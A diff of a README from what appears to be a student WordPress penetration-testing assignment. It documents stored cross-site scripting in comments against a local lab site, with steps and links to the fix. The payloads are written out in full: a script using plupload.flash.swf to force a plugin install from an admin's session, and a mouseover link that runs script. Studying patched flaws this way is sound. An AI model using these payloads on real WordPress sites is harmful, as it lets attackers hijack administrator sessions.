@@ -32,15 +32,15 @@ Time spent: 26 hours spent in total
 - [x] GIF Walkthrough: 
  ![Walkthrough exploit 2](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/2nd%20vulnerability.gif)
 - [x] Steps to recreate: 
-  - Insert a malicious code followed by a button and a script to the comment section of a post
+  - Insert the following malicious code followed by a button and a script to the comment section of a post
 
     `<button onclick="fire()">Click</button>`  
-    `<script>        
-       function fire() {
-       open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'",2000)');
-       setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
-       }
-       </script>`
+    `<script>`        
+       `function fire() {
+       open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'",2000)');`
+       `setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+       }`
+       `</script>`
   - Post the comment as admin
   - A button will appear as a comment
   - Click the button
@@ -84,7 +84,7 @@ Time spent: 26 hours spent in total
   - Write the following maicilious code of a link that sends alert when scrolled above hello world in the page
  
       `<a href='/wp-admin/' title="XSS" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(2)//'>Hello world</a>`
-  - Post the malicious comment and watch the alert being triggered.
+  - Post the malicious comment and watch the alert being triggered
 - [x] Affected source code:
   - [Core Trac WordPress](https://core.trac.wordpress.org/changeset/33549)
   - [Sucuri Blog](https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html)
